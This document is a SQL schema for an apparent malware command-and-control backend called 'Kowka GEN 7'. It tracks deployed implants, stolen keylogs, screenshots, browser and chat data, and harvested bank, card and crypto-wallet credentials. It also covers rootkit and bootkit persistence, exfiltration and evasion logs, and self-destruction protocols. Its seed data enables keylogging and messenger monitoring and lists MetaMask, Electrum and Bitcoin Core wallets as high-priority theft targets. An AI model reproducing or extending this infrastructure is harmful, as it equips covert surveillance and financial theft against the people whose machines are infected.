-- Kowka GEN 7 Database Initialization Schema
-- Quantum-resistant cyber operations platform

BEGIN TRANSACTION;

-- Enable foreign key support and other pragmas
PRAGMA foreign_keys = ON;
PRAGMA journal_mode = WAL;
PRAGMA synchronous = NORMAL;

-- Agents table for tracking all deployed implants
CREATE TABLE IF NOT EXISTS agents (
    agent_id TEXT PRIMARY KEY,
    registration_date DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_checkin DATETIME,
    system_profile JSON,
    persistence_methods JSON,
    risk_level TEXT DEFAULT 'LOW' CHECK(risk_level IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
    status TEXT DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'INACTIVE', 'COMPROMISED', 'DESTROYED')),
    active BOOLEAN DEFAULT TRUE,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Intelligence data storage with encryption markers
CREATE TABLE IF NOT EXISTS intelligence_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    data_type TEXT NOT NULL CHECK(data_type IN (
        'KEYLOGS', 'SCREENSHOTS', 'NETWORK', 'BROWSER', 
        'DOCUMENTS', 'FINANCIAL', 'SYSTEM', 'COMMUNICATIONS'
    )),
    encrypted_data TEXT NOT NULL,
    encryption_key_id TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    processed BOOLEAN DEFAULT FALSE,
    priority INTEGER DEFAULT 1 CHECK(priority BETWEEN 1 AND 5),
    size_bytes INTEGER DEFAULT 0,
    FOREIGN KEY (agent_id) REFERENCES agents(agent_id) ON DELETE CASCADE
);

-- Financial records and asset tracking
CREATE TABLE IF NOT EXISTS financial_records (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    record_type TEXT NOT NULL CHECK(record_type IN (
        'CRYPTO_WALLET', 'BANK_ACCOUNT', 'INVESTMENT', 
        'CREDIT_CARD', 'PAYMENT_ACCOUNT', 'OTHER'
    )),
    platform TEXT,
    credentials JSON,
    balance REAL DEFAULT 0.0,
    currency TEXT DEFAULT 'USD',
    address TEXT,
    holder_name TEXT,
    last_accessed DATETIME,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    recovered BOOLEAN DEFAULT FALSE,
    recovery_attempts INTEGER DEFAULT 0,
    FOREIGN KEY (agent_id) REFERENCES agents(agent_id) ON DELETE SET NULL
);

-- System events and operational logging
CREATE TABLE IF NOT EXISTS system_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    event_type TEXT NOT NULL CHECK(event_type IN (
        'AGENT_CHECKIN', 'AGENT_DEPLOYED', 'AGENT_COMPROMISED',
        'INTELLIGENCE_RECEIVED', 'FINANCIAL_DISCOVERED', 
        'DESTRUCTION_TRIGGERED', 'SECURITY_ALERT', 'SYSTEM_ERROR'
    )),
    severity TEXT DEFAULT 'INFO' CHECK(severity IN ('DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL')),
    description TEXT,
    agent_id TEXT,
    details JSON,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    resolved BOOLEAN DEFAULT FALSE,
    resolved_at DATETIME,
    FOREIGN KEY (agent_id) REFERENCES agents(agent_id) ON DELETE SET NULL
);

-- Cryptographic key management
CREATE TABLE IF NOT EXISTS cryptographic_keys (
    key_id TEXT PRIMARY KEY,
    key_type TEXT NOT NULL CHECK(key_type IN (
        'MASTER_ENCRYPTION', 'AGENT_COMMUNICATION', 'DATA_ENCRYPTION',
        'SIGNATURE', 'BACKUP', 'EMERGENCY'
    )),
    encrypted_key TEXT NOT NULL,
    creation_date DATETIME DEFAULT CURRENT_TIMESTAMP,
    expiration_date DATETIME,
    last_rotated DATETIME,
    active BOOLEAN DEFAULT TRUE,
    key_metadata JSON
);

-- Destruction protocol history
CREATE TABLE IF NOT EXISTS destruction_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    protocol_level TEXT NOT NULL CHECK(protocol_level IN ('LOW', 'MEDIUM', 'HIGH', 'EMERGENCY')),
    target_type TEXT NOT NULL CHECK(target_type IN ('AGENT', 'SYSTEM', 'DATA')),
    target_id TEXT,
    initiated_by TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'PENDING' CHECK(status IN ('PENDING', 'EXECUTING', 'COMPLETED', 'FAILED')),
    completion_time DATETIME,
    details JSON
);

-- Network operations and C2 channels
CREATE TABLE IF NOT EXISTS network_operations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    operation_type TEXT NOT NULL CHECK(operation_type IN (
        'C2_COMMUNICATION', 'DATA_EXFILTRATION', 'LATERAL_MOVEMENT',
        'NETWORK_SCAN', 'SERVICE_DISCOVERY', 'VULNERABILITY_SCAN'
    )),
    source_agent TEXT,
    target_host TEXT,
    target_port INTEGER,
    protocol TEXT,
    success BOOLEAN,
    data_sent INTEGER DEFAULT 0,
    data_received INTEGER DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    duration_ms INTEGER,
    FOREIGN KEY (source_agent) REFERENCES agents(agent_id) ON DELETE SET NULL
);

-- Behavioral adaptation patterns
CREATE TABLE IF NOT EXISTS behavioral_patterns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    pattern_type TEXT NOT NULL CHECK(pattern_type IN (
        'CHECKIN_FREQUENCY', 'DATA_TRANSFER', 'NETWORK_BEHAVIOR',
        'RESOURCE_USAGE', 'SECURITY_EVASION', 'PERSISTENCE_MAINTENANCE'
    )),
    pattern_data JSON NOT NULL,
    confidence_score REAL DEFAULT 0.0 CHECK(confidence_score BETWEEN 0.0 AND 1.0),
    last_observed DATETIME DEFAULT CURRENT_TIMESTAMP,
    active BOOLEAN DEFAULT TRUE,
    FOREIGN KEY (agent_id) REFERENCES agents(agent_id) ON DELETE CASCADE
);

-- Persistence mechanism tracking
CREATE TABLE IF NOT EXISTS persistence_mechanisms (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT,
    mechanism_type TEXT NOT NULL CHECK(mechanism_type IN (
        'REGISTRY', 'SERVICE', 'SCHEDULED_TASK', 'STARTUP_FOLDER',
        'BOOTKIT', 'ROOTKIT', 'FIRMWARE', 'OTHER'
    )),
    location TEXT,
    configuration JSON,
    installed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_verified DATETIME,
    active BOOLEAN DEFAULT TRUE,
    stealth_level INTEGER DEFAULT 1 CHECK(stealth_level BETWEEN 1 AND 5),
    FOREIGN KEY (agent_id) REFERENCES agents(agent_id) ON DELETE CASCADE
);

-- Intelligence collection modules status
CREATE TABLE IF NOT EXISTS collection_modules (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    module_name TEXT UNIQUE NOT NULL,
    module_type TEXT NOT NULL CHECK(module_type IN (
        'KEYLOGGER', 'SCREEN_CAPTURE', 'NETWORK_SNIFFING',
        'BROWSER_EXTRACTION', 'DOCUMENT_SCANNING', 'COMMUNICATION_MONITORING'
    )),
    enabled BOOLEAN DEFAULT TRUE,
    last_active DATETIME,
    configuration JSON,
    success_rate REAL DEFAULT 0.0 CHECK(success_rate BETWEEN 0.0 AND 1.0),
    data_collected INTEGER DEFAULT 0
);

-- Financial monitoring targets
CREATE TABLE IF NOT EXISTS financial_targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_name TEXT NOT NULL,
    target_type TEXT NOT NULL CHECK(target_type IN (
        'CRYPTO_WALLET', 'BANKING_APP', 'INVESTMENT_PLATFORM',
        'PAYMENT_PROCESSOR', 'TRADING_SOFTWARE'
    )),
    detection_patterns JSON,
    priority INTEGER DEFAULT 1 CHECK(priority BETWEEN 1 AND 5),
    enabled BOOLEAN DEFAULT TRUE,
    last_detected DATETIME,
    detection_count INTEGER DEFAULT 0
);

-- Dead man's switch configuration
CREATE TABLE IF NOT EXISTS deadman_switch (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    enabled BOOLEAN DEFAULT FALSE,
    checkin_interval_hours INTEGER DEFAULT 24,
    last_operator_checkin DATETIME,
    destruction_protocol TEXT DEFAULT 'HIGH' CHECK(destruction_protocol IN ('LOW', 'MEDIUM', 'HIGH', 'EMERGENCY')),
    activation_warning_sent BOOLEAN DEFAULT FALSE
);

-- System configuration and settings
CREATE TABLE IF NOT EXISTS system_configuration (
    config_key TEXT PRIMARY KEY,
    config_value JSON NOT NULL,
    config_type TEXT DEFAULT 'STRING' CHECK(config_type IN ('STRING', 'INTEGER', 'BOOLEAN', 'JSON')),
    description TEXT,
    last_modified DATETIME DEFAULT CURRENT_TIMESTAMP,
    modified_by TEXT
);

-- Indexes for performance optimization
CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status, active);
CREATE INDEX IF NOT EXISTS idx_agents_risk ON agents(risk_level, last_checkin);
CREATE INDEX IF NOT EXISTS idx_intelligence_timestamp ON intelligence_data(timestamp, data_type);
CREATE INDEX IF NOT EXISTS idx_intelligence_agent ON intelligence_data(agent_id, processed);
CREATE INDEX IF NOT EXISTS idx_financial_recovered ON financial_records(recovered, record_type);
CREATE INDEX IF NOT EXISTS idx_events_severity ON system_events(severity, timestamp);
CREATE INDEX IF NOT EXISTS idx_network_timestamp ON network_operations(timestamp, operation_type);
CREATE INDEX IF NOT EXISTS idx_destruction_timestamp ON destruction_history(timestamp, status);

-- Views for common queries
CREATE VIEW IF NOT EXISTS agent_activity_summary AS
SELECT 
    agent_id,
    COUNT(*) as total_checkins,
    MAX(last_checkin) as last_activity,
    AVG(JULIANDAY('now') - JULIANDAY(last_checkin)) as days_since_checkin
FROM agents 
WHERE active = TRUE 
GROUP BY agent_id;

CREATE VIEW IF NOT EXISTS intelligence_collection_stats AS
SELECT 
    data_type,
    COUNT(*) as total_items,
    SUM(size_bytes) as total_size,
    AVG(priority) as average_priority,
    MAX(timestamp) as latest_collection
FROM intelligence_data 
WHERE processed = FALSE
GROUP BY data_type;

CREATE VIEW IF NOT EXISTS financial_assets_summary AS
SELECT 
    record_type,
    COUNT(*) as total_accounts,
    SUM(balance) as total_balance,
    AVG(balance) as average_balance,
    SUM(CASE WHEN recovered = TRUE THEN balance ELSE 0 END) as recovered_balance
FROM financial_records 
GROUP BY record_type;

-- Insert initial configuration
INSERT OR IGNORE INTO system_configuration (config_key, config_value, config_type, description) VALUES
('crypto_algorithm', '"kyber-768-aes256-hybrid"', 'STRING', 'Primary cryptographic algorithm'),
('key_rotation_interval', '86400', 'INTEGER', 'Key rotation interval in seconds'),
('agent_checkin_interval', '300', 'INTEGER', 'Default agent check-in interval'),
('max_intelligence_size', '1073741824', 'INTEGER', 'Maximum intelligence data size in bytes'),
('destruction_timeout', '300', 'INTEGER', 'Destruction protocol timeout in seconds'),
('network_stealth_mode', 'true', 'BOOLEAN', 'Enable network traffic mimicking'),
('auto_persistence_maintenance', 'true', 'BOOLEAN', 'Automatically maintain persistence mechanisms');

-- Insert default collection modules
INSERT OR IGNORE INTO collection_modules (module_name, module_type, enabled, configuration) VALUES
('keylogger', 'KEYLOGGER', TRUE, '{"sensitivity": "HIGH", "capture_windows": true}'),
('screencap', 'SCREEN_CAPTURE', TRUE, '{"interval": 60, "quality": 0.8}'),
('netsniff', 'NETWORK_SNIFFING', TRUE, '{"protocols": ["TCP", "UDP", "HTTP", "HTTPS"]}'),
('browserext', 'BROWSER_EXTRACTION', TRUE, '{"browsers": ["chrome", "firefox", "edge"]}'),
('docscan', 'DOCUMENT_SCANNING', TRUE, '{"extensions": [".pdf", ".doc", ".docx", ".xls", ".xlsx"]}'),
('commmon', 'COMMUNICATION_MONITORING', TRUE, '{"applications": ["discord", "telegram", "whatsapp"]}');

-- Insert default financial targets
INSERT OR IGNORE INTO financial_targets (target_name, target_type, detection_patterns, priority) VALUES
('bitcoin_core', 'CRYPTO_WALLET', '["wallet.dat", "Bitcoin"]', 5),
('metamask', 'CRYPTO_WALLET', '["MetaMask", "ether"]', 5),
('electrum', 'CRYPTO_WALLET', '["Electrum", "wallet"]', 4),
('chrome_banking', 'BANKING_APP', '["bank", "login", "password"]', 4),
('paypal', 'PAYMENT_PROCESSOR', '["PayPal", "payment"]', 3),
('tradingview', 'TRADING_SOFTWARE', '["trading", "chart", "stock"]', 3);

COMMIT;
